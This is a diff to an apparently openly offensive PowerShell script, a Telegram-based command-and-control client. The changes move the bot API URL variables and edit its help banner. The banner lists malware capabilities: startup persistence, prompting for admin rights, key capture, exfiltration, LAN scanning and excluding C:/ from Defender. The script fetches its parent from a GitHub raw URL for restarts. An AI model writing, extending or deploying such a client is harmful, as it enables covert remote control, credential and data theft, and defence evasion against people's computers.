@@ -20,6 +20,8 @@ $Token = "$tg"  # REPLACE $tg with Your Telegram Bot Token
 $PassPhrase = "$env:COMPUTERNAME" # 'password' for this connection (computername by default)
 $global:errormsg = 0 # 1 = return error messages to chat (off by default)
 $parent = "https://raw.githubusercontent.com/beigeworm/Powershell-Tools-and-Toys/main/Command-and-Control/Telegram-C2-Client.ps1" # parent script URL (for restarts and persistance)
+$apiUrl = "https://api.telegram.org/bot$Token/sendMessage"
+$URL = 'https://api.telegram.org/bot{0}' -f $Token
 $AcceptedSession=""
 $LastUnAuthenticatedMessage=""
 $lastexecMessageID=""
@@ -36,8 +38,6 @@ if(Test-Path "C:\Windows\Tasks\service.vbs"){rm -path "C:\Windows\Tasks\service.
 # Get Chat ID from the bot
 while($chatID.length -eq 0){
 write-host "Waiting for Chat ID.."
-$apiUrl = "https://api.telegram.org/bot$Token/sendMessage"
-$URL = 'https://api.telegram.org/bot{0}' -f $Token
 $updates = Invoke-RestMethod -Uri ($url + "/getUpdates")
 if ($updates.ok -eq $true) {$latestUpdate = $updates.result[-1]
 if ($latestUpdate.message -ne $null){$chatID = $latestUpdate.message.chat.id;Write-Host "Chat ID: $chatID"}}
@@ -56,8 +56,6 @@ Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
 
 Function Options{
 $contents = "==============================================
-========= $comp Telegram C2 Options List $comp ========
-==============================================
 ============= $cmde Commands List $cmde ============
 ==============================================
 
@@ -78,7 +76,7 @@ Add-Persistance   : Add Telegram C2 to Startup
 Remove-Persistance   : Remove Startup Persistance
 Is-Admin   : Checks if session has admin Privileges
 Attempt-Elevate  : Send user a prompt to gain Admin
-Message   : Send a message to connected computer
+Message   : Send a custom message to the user
 Kill    : Killswitch for 'Key-Capture' and 'Exfiltrate' 
 **ADMIN ONLY FUNCTIONS**
 Disable-AV   : Attempt to exclude C:/ from Defender
@@ -117,6 +115,9 @@ Use 'Folder-Tree' command to show all files
 ============  Enumerate-LAN Example ============
 ( PS`> Enumerate-LAN -Prefix 192.168.1. )
 This Eg. will scan 192.168.1.1 to 192.168.1.254
+
+===============  Message Example ===============
+( PS`> Message 'Your Message Here!' )
 
 =============================================="
 $params = @{chat_id = $ChatID ;text = $contents}
